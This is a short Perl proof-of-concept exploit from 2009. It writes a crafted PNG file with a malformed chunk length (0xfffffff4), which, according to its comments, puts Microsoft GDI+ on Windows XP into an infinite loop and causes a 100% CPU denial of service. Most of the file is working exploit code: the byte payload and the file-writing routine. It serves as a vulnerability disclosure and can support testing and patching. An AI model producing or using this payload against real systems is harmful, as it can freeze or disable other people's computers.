#! /usr/bin/perl
#CAL_gdiplug_poc.pl
#
# Mircosoft_gdiplug_png_infinity_loop_D.o.S POC
# by Code Audit Labs public 2009-04-17
# http://www.vulnhunt.com/
# 
#Affected
#========
#test on full updated winxp sp3
#other version should be affected
#
#CVE: please assign to a CVE number
#
#DESCRIPTION
#===========
#
#  The vulnerability exists within the code in MicroSoft Gdi+ processing crafted png file. that cause infinity loop to cause high CPU(100%) and D.o.S . 
#
#
#ANALYSIS
#========
#
#  png chunk
#
# {
#	DWORD btChunkLen;
#	CHAR btChunkType[4];
#} CHUNK_HEADER;

#if btChunkLen is 0xfffffff4, would cause code fall into infinity loop
#

open(Fin, ">poc.png") || die "can't create crash sample.$!";
binmode(Fin);
$data = 
"\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52" .
"\x00\x00\x03\x00\x00\x00\x04\x00\x08\x02\x00\x00\x00\xd9\x44\xa9" .
"\x57\xff\xff\xff\xf4\x41\x41\x41\x41\x62\x01\x08\xcb\x06\x49\x3e" .
"\xd7\x0a\x00\x22\xe3\xf1\x32\x3e\xe8";

print Fin $data;

close(Fin);

# milw0rm.com [2009-04-17]
